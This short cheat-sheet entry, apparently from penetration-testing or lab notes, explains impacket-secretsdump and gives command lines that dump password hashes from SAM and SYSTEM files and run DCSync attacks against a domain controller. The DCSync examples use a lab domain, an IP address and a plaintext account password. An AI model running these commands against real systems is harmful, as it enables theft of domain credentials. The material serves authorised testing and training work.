What is impacket-secretsdump?

impacket-secretsdump is a Python script within the Impacket toolset that can dump password hashes and other credentials from Windows machines by accessing the local registry hives, such as the Security Account Manager (SAM) and Local Security Authority (LSA).

Usage

Extract all users' password with sam and system file.

impacket-secretsdump -sam sam -system system LOCAL

DCsync Attacking

impacket-secretsdump -just-dc-user administrator egotisticalbank/svc_loanmgr:"Moneymakestheworldgoround\!"@10.129.95.180

DCsync with Kerberos Ticket

 impacket-secretsdump -just-dc-user administrator -k -no-pass DC.SOME.DOMAIN
